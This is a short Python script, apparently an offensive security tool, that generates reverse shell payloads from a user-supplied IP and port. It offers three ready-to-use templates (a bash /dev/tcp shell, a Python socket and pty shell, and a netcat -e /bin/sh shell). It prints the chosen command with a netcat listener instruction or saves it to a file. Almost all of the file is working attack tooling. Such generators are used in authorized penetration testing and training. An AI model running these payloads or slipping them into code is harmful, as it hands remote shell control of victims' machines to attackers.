#!/usr/bin/env python3

import sys

# Color Codes
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

def print_output(final_command, desc, lport):
    """Print the payload and execution instructions with color."""
    print(f"\n{CYAN}[*] Payload Description:{RESET} {desc}")
    print(f"{CYAN}[*] Listening Port:{RESET} {lport}\n")
    print(f"{GREEN}[+] Your Payload Command:{RESET}\n")
    print(final_command)
    print(f"\n{YELLOW}To start a listener, run the following command:{RESET}")
    print(f"nc -lvnp {lport}\n")

def main():
    print(f"{CYAN}--- Reverse Shell Payload Generator ---{RESET}\n")
    
    # Collecting user input
    ip = input("Enter your IP address: ").strip()
    lport = input("Enter listening port: ").strip()
    
    # Payload templates
    payloads = {
        "1": {
            "desc": "Bash TCP Reverse Shell",
            "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        },
        "2": {
            "desc": "Python Reverse Shell",
            "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        },
        "3": {
            "desc": "Netcat Reverse Shell",
            "template": "nc -e /bin/sh {ip} {port}"
        }
    }
    
    # Display options
    print("\nSelect Payload Type:")
    for key, value in payloads.items():
        print(f"{key}. {value['desc']}")
    
    choice = input("\nEnter choice (1-3): ").strip()
    if choice not in payloads:
        print(f"{RED}[!] Invalid choice. Exiting.{RESET}")
        sys.exit(1)
    
    desc = payloads[choice]["desc"]
    template = payloads[choice]["template"]
    
    # Final command
    final_command = template.format(ip=ip, port=lport)
    
    # Ask export or display
    export_choice = input(f"\n{YELLOW}Do you want to export the payload to a file? (y/n): {RESET}").strip().lower()
    
    if export_choice == 'y':
        filename = input("Enter filename (default: payload.txt): ").strip() or "payload.txt"
        try:
            with open(filename, 'w') as f:
                f.write(final_command)
            print(f"\n{GREEN}[+] Payload successfully exported to {filename}{RESET}")
        except Exception as e:
            print(f"\n{RED}[!] Error writing to file: {e}{RESET}")
    else:
        print_output(final_command, desc, lport)

if __name__ == "__main__":
    main()
